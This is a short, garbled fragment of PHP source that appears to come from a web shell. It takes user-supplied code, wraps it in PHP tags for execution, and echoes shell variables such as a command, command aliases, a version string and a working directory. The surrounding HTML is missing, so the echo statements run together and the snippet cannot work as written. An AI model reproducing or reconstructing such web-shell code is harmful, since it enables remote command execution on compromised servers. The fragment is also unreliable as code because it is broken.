...
",$r);
   ...
   $r = stripslashes($r); 
   $strip = false;
   if(!strpos($r,"<?") && substr($r,0,2)!="<?") {$r="<?php\n".trim($r)."\n?><?php echo $surl; ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $surl; ?><?php echo $dispd; ?><?php foreach ($aliases as $als) {echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";} ?><?php echo $surl; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $shver; ?><?php echo $surl; ?><?php echo $microtime; ?><?php chdir($lastdir); ?>